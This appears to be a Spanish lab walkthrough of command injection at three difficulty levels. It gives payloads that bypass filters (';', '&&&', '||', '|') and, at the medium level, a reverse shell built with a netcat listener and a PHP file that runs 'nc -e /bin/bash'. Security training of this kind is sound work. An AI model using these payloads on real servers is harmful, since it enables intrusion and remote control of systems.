# Command Injection

La vulnerabilidad de inyección de comandos es una vulnerabilidad de seguridad que permite a un atacante ejecutar comandos arbitrarios en el sistema operativo del servidor. Esto puede conducir a la ejecución de comandos arbitrarios en el sistema operativo del servidor.

## Bajo

El planteamiento seguido ha sido el de ejecutar un comando después de otro, para ello, hemos completado el `ping -c 4` con una ip y a continueación hemos añadido la sentencia `; id` para mostrar el usuario que ejecuta el servicio web.

```bash
127.0.0.1 > /dev/null; id
```

![challenge](/CI/assets/challenge.png)

## Medio

Para este nivel, vemos que entradas como las siguientes no funcionan, esto es debido a que el servidor esta eliminando expresiones como `;` y `&&`.

```bash
127.0.0.1 > /dev/null; id
127.0.0.1 > /dev/null && id
```

Sin embargo, podemos aprovechar que la implementación no es segura y con alguna pequeña modificación podemos bypassear la protección.
<br>
**x** es el número de `&` que se deben escribir para que el comando `id` se ejecute.

$$
x = 2n + 3, n\in \mathbb{N}
$$

```bash
127.0.0.1 > /dev/null &&& id
```

Además, otra de las multiples posibilidades es utilizar el operador `||` para ejecutar el comando `id` si el comando anterior falla. Para ello se fuerza el fallo colocando una cadena invalida `-`.

```bash
- || id
```

![challenge](/CI/assets/challenge.png)

--- 

### Reverse shell

El primer paso es crear un servidor de escucha en el puerto 4000.

```bash	
nc -lvnp 4000
```

El siguiente paso es crear un archivo php que ejecute el comando `nc` para establecer una conexión con el servidor de escucha.

```bash
- || echo '<?php system("nc 127.0.0.1 4000 -e /bin/bash"); ?>' > shell.php
```

Por último, se ejecuta el archivo php para obtener una shell.

```bash
- || php shell.php
```

Como parte opcional se puede utilizar el siguiente comando para obtener una shell interactiva.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

![shell](/CI//assets/reverse-shell.png)

## Alto

En este nivel, vemos que el servidor esta filtrando la entrada de comandos, por lo que no podemos ejecutar comandos arbitrarios. Sin embargo, al probar el comando utilizado para el nivel medio, vemos que el servidor esta fallando al filtrar la entrada.

```bash
- || id
```

Se ha detectado otra brecha al escribir el siguiente comando sin ningún espacio.

```bash
127.0.0.1|id
```

![challenge](/CI/assets/challenge.png)


